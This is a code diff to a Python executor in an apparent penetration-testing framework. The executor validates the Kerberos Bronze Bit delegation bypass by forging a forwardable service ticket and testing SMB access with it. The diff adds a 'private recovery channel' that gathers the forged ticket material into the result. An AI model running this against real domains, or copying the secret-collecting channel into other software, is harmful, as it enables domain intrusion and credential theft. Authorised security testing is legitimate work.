@@ -33,7 +33,8 @@ from typing import Any
 
 from .. import netresolve, proof, states
 from ..recommend import ParamSpec, ParamValue, values, recommended_spn
-from .base import (ValidationExecutor, ExecutorContext, StepRecord, redact_argv,
+from ._reveal_common import key_material
+from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, redact_argv,
                    Capability, CAP_CCACHE)
 from . import _s4u_common as s4u
 
@@ -96,7 +97,18 @@ class BronzeBitExecutor(ValidationExecutor):
             f"nxc smb {v['target_host']} -k --use-kcache   (classify exploited/kdc_patched/not_delegatable)",
         ]
 
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
+
     def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
+        # Private recovery channel, populated before downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish_result(*args):
+            artifact.update(self._result(*args))
+            return artifact
+
         cfg = ctx.config
         v = values(params)
         svc, impersonate = v["service_account"], v["impersonate"]
@@ -122,11 +134,13 @@ class BronzeBitExecutor(ValidationExecutor):
         ctrl_argv = base_argv + key_and_target
         res = ctx.runner.run(ctrl_argv, timeout=cfg.tool_timeout_s,
                              env={"KRB5CCNAME": None}, cwd=str(out_dir))
-        if s4u.parse_ticket(res.stdout or "", out_dir) is not None:
+        control_ticket = s4u.parse_ticket(res.stdout or "", out_dir)
+        artifact["_reveal"].extend(key_material(self.technique, "ccache", impersonate, control_ticket))
+        if control_ticket is not None:
             rec("getST_control", ctrl_argv, res, True,
                 note="ordinary delegation succeeds WITHOUT the CVE (not Bronze Bit)")
             errors.append("ordinary_delegation")
-            return self._result(steps, errors, None, False, svc, impersonate, spn,
+            return finish_result(steps, errors, None, False, svc, impersonate, spn,
                                 target_host, "ordinary_delegation", cfg)
         # The control must CONCLUSIVELY fail non-forwardable (KDC_ERR_BADOPTION) to establish
         # the CVE case. A timeout / transport / tool / other error is INCONCLUSIVE -- it does
@@ -137,7 +151,7 @@ class BronzeBitExecutor(ValidationExecutor):
             note = ctrl_reason or ("timeout" if res.timed_out else (res.error or "no_rejection"))
             rec("getST_control", ctrl_argv, res, False, note=f"control inconclusive ({note})")
             errors.append("inconclusive:control_inconclusive")
-            return self._result(steps, errors, None, False, svc, impersonate, spn,
+            return finish_result(steps, errors, None, False, svc, impersonate, spn,
                                 target_host, "inconclusive", cfg)
         rec("getST_control", ctrl_argv, res, False,
             note="control conclusively non-forwardable (KDC_ERR_BADOPTION)")
@@ -147,13 +161,14 @@ class BronzeBitExecutor(ValidationExecutor):
         res = ctx.runner.run(getst_argv, timeout=cfg.tool_timeout_s,
                              env={"KRB5CCNAME": None}, cwd=str(out_dir))
         ticket = s4u.parse_ticket(res.stdout or "", out_dir)
+        artifact["_reveal"].extend(key_material(self.technique, "ccache", impersonate, ticket))
         if ticket is None:
             # No forged ticket: CLASSIFY the target from the Kerberos error (the carrier).
             reason = s4u.classify_kerberos_failure((res.stdout or "") + "\n" + (res.stderr or "")) \
                 or "failed"
             rec("getST_force_forwardable", getst_argv, res, False, note=reason)
             errors.append(reason)
-            return self._result(steps, errors, None, False, svc, impersonate, spn,
+            return finish_result(steps, errors, None, False, svc, impersonate, spn,
                                 target_host, reason, cfg)
         rec("getST_force_forwardable", getst_argv, res, True,
             note="forged forwardable ticket accepted (control had failed)")
@@ -172,7 +187,7 @@ class BronzeBitExecutor(ValidationExecutor):
                 errors.append(diag)
             errors.append("nxc_access_failed")
         classification = "exploited" if access else "forged_no_access"
-        art = self._result(steps, errors, ticket, access, svc, impersonate, spn,
+        art = finish_result(steps, errors, ticket, access, svc, impersonate, spn,
                            target_host, classification, cfg)
         if access:
             art["_composed_products"] = {"ccache": ticket, "principal": impersonate}
